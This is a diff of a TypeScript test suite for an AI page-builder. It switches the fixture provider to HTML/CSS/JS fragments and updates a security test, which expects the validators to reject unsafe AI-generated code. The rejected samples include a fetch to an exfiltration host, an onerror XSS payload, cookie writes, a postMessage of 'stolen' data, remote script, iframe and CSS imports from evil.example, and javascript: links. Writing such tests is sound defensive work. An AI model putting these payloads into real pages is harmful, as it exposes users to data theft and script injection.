@@ -28,14 +28,15 @@ import { redactTelemetry } from "@/server/observability/telemetry";
 import { fixtureProviderResolver } from "@/domain/ai/testing/provider-fixtures";
 
 const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
-const simplePage = `export default function Page(){return <main className="c-page"><h1>Home</h1></main>}`;
+type Fragment = { html: string; css?: string; js?: string };
+const simplePage: Fragment = { html: `<main data-canvas-id="page" class="c-page"><h1>Home</h1></main>` };
 
 class FixtureProvider implements AIProvider { readonly capabilities = { structuredOutput: true, vision: true };
   name = "fixture"; model = "fixture-1";
-  constructor(private readonly source = simplePage) {}
+  constructor(private readonly fragment: Fragment = simplePage) {}
   async generateText(): Promise<AIResponse> { return { text: "", provider: this.name, model: this.model }; }
   async generateStructured<T>(_request: AIRequest, validator: StructuredValidator<T>): Promise<AIResponse<T>> {
-    const value = { schemaVersion: 1, sourceCode: this.source, referencedMediaIds: [], summary: { headline: "Built", changes: ["Created"], limitations: [] } };
+    const value = { schemaVersion: 1, html: this.fragment.html, css: this.fragment.css ?? "", js: this.fragment.js ?? "", referencedMediaIds: [], summary: { headline: "Built", changes: ["Created"], limitations: [] } };
     return { text: "", structuredData: validator.parse(value), provider: this.name, model: this.model };
   }
 }
@@ -46,10 +47,10 @@ async function makeProject(userId: string, name: string) {
   const home = await new PageTreeService().create(userId, { projectId: project.id, type: "page", name: "Home" });
   return { workspace, project, home };
 }
-async function generateHome(userId: string, projectId: string, pageId: string, source = simplePage) {
+async function generateHome(userId: string, projectId: string, pageId: string, fragment: Fragment = simplePage) {
   const request = await new GenerationJobService().createPageJob(userId, { projectId, pageId, content: "build", selectedMediaIds: [] });
   await claimGenerationJob("worker");
-  const job = await new AIOrchestrationService(db, undefined, undefined, fixtureProviderResolver(() => new FixtureProvider(source))).process(request.job.id);
+  const job = await new AIOrchestrationService(db, undefined, undefined, fixtureProviderResolver(() => new FixtureProvider(fragment))).process(request.job.id);
   if (job?.status !== "completed") throw new Error(`generation failed: ${job?.errorCode}`);
 }
 async function addMedia(projectId: string, userId: string) {
@@ -211,16 +212,21 @@ describe.sequential("security boundaries", () => {
   it("never activates unsafe generated code from any surface", async () => {
     const owner = await makeUser("owner");
     const { project, home } = await makeProject(owner.id, "Codegen");
+    // Each entry is a way out of the sandbox that the three validators must close.
     for (const unsafe of [
-      `export default function Page(){fetch("https://exfiltrate.example");return <main/>}`,
-      `export default function Page(){return <main dangerouslySetInnerHTML={{__html:"<img src=x onerror=alert(1)>"}}/>}`,
-      `import { cookies } from "next/headers";export default function Page(){return <main>{cookies().toString()}</main>}`,
-      `export default function Page(){return <script src="https://cdn.example/x.js" />}`,
-      `export default function Page(){return <iframe src="https://evil.example" />}`,
-      `export default function Page(){document.cookie="a=b";return <main/>}`,
-      `export default function Page(){return <a href="javascript:alert(1)">x</a>}`,
+      { html: `<main data-canvas-id="page"></main>`, js: `fetch("https://exfiltrate.example");` },
+      { html: `<main data-canvas-id="page"></main>`, js: `document.querySelector("h1").innerHTML = "<img src=x onerror=alert(1)>";` },
+      { html: `<main data-canvas-id="page"></main>`, js: `document.cookie = "a=b";` },
+      { html: `<main data-canvas-id="page"></main>`, js: `parent.postMessage("stolen", "*");` },
+      { html: `<main data-canvas-id="page"></main>`, js: `document.querySelector("h1").setAttribute("data-canvas-id", "forged");` },
+      { html: `<script data-canvas-id="page" src="https://cdn.example/x.js"></script>` },
+      { html: `<iframe data-canvas-id="page" src="https://evil.example"></iframe>` },
+      { html: `<main data-canvas-id="page" onclick="alert(1)"></main>` },
+      { html: `<a data-canvas-id="page" href="javascript:alert(1)">x</a>` },
+      { html: `<main data-canvas-id="page"></main>`, css: `@import url("https://evil.example/x.css");` },
+      { html: `<main data-canvas-id="page"></main>`, css: `body{display:none}` },
     ]) {
-      await expect(generateHome(owner.id, project.id, home.id, unsafe)).rejects.toThrow(/AI_GENERATED_SOURCE_INVALID/);
+      await expect(generateHome(owner.id, project.id, home.id, unsafe)).rejects.toThrow(/AI_GENERATED_DOCUMENT_INVALID/);
     }
     expect(await db.select().from(pageVersions)).toHaveLength(0);
   });
